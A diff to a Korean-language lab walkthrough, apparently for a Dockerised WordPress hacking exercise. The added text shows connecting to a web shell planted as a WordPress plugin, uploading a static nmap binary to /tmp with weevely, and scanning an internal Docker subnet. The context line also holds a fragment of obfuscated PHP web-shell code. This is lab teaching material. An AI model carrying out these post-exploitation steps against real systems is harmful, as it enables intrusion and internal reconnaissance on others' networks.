@@ -98,5 +98,29 @@ $C=$B('',$k);$C();
 
 - [Update File]
 
-## 웹쉘 연결
-- 
+## 웹쉘 연결 후 내부 정보 수집
+- 대부분 wordpress에서 플러그인 업로드를 하면 /wp-content/plugins/[펄러그인].php
+```
+http://192.168.146.129:8000/wp-content/plugins/hello.php hacker
+```
+
+- nmap 바이너리 파일을 weevely의 file_upload 모듈을 사용하여 침투한 시스템에 업로드.
+- https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap 다운로드 하여 kali에 옮기기
+- tmp 파일에 nmap 바이너리를 넣는 이유는 침투했을 때 권한이 www-data 이기 때문에 권한이 있는 임시 디렉토리인 tmp에 업로드 한 것이다.
+```
+file_upload /home/kali/Downloads/nmap /tmp/nmap
+ls
+chmod +x nmap
+```
+
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/fa80b0c0-2ce3-47dd-a159-5b42f6929c3e)
+
+- 내부 프라이빗 ip 확인후 내부 인터넷 망 스캔
+
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/67d1f594-b753-472f-8d7a-26275ef88c6e)
+
+
+```
+ip addr
+./nmap 172.18.0.0/16
+```
